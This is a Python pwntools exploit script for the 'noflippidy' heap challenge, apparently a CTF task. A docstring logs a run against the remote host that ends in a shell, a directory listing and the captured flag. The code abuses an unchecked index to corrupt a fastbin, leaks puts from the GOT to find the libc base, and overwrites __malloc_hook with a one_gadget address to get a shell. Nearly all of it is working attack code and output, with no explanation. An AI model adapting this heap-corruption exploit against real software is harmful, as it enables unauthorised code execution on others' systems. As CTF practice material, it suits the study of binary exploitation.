from pwn import *

"""
[◐] Opening connection to noflippidy.hackable.software on port 1337
[◑] -request| noflippidy.hackable.software
|DNSOpening connection to noflippidy.hackable.software on port 1337: Trying 34.159.245.118
[+] Opening connection to noflippidy.hackable.software on port 1337: Done
('puts_leak', '0x7f2df1a63aa0')
('libc_base', '0x7f2df19e3000')
$
[*] Switching to interactive mode


\xa0:\xa6�-

2. Flip your notebook!
3. Exit
: $ 1
Index: $ 2
$ ls -la
total 28
drwxr-xr-x 2 nobody nogroup  4096 Nov 27 09:37 .
drwxr-xr-x 3 nobody nogroup  4096 Nov 27 09:43 ..
-rw-r--r-- 1 nobody nogroup    42 Nov 27 09:37 flag.txt
-rwxr-xr-x 1 nobody nogroup 14472 Nov 27 09:37 noflippidy
$ cat flag.txt
DrgnS{R3m3m83r_k1dS_s734L1nG_Is_N07_c00L}
$
"""

e = ELF("./noflippidy")
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# r = process("./noflippidy")
r  = remote("noflippidy.hackable.software", 1337)

def menu():
    r.recvuntil(":")

def add(index, data):
    menu()
    r.sendline("1")
    r.sendlineafter("Index: ", str(index))
    r.sendafter("Content: ", data)

# 0x2fffffff
r.sendlineafter("be: ", str(805306367))

# abusing fastbin 
# overwriting menu ptr to leak puts
add(268949898, p64(0) + p64(0x41) + p64(0x0000000000404010-8) + b"\n")
add(1, b"A\n")
add(2, p64(0) + p64(e.got.puts) + b"\n")
r.recvline()
r.recvline()
puts_leak = u64(r.recvline().rstrip().ljust(8, "\x00"))
print("puts_leak", hex(puts_leak))

libc_base = puts_leak - l.symbols.puts
print("libc_base", hex(libc_base))

magic = libc_base + 0x10a41c
malloc_hook = libc_base + 0x3ebc30

raw_input("$ ")

add(268949898, p64(0) + p64(0x41) + p64(malloc_hook-0x28) + b"\n")
add(1, b"A\n")
add(2, p64(0)*3 + p64(magic) + b"\n")

r.interactive()
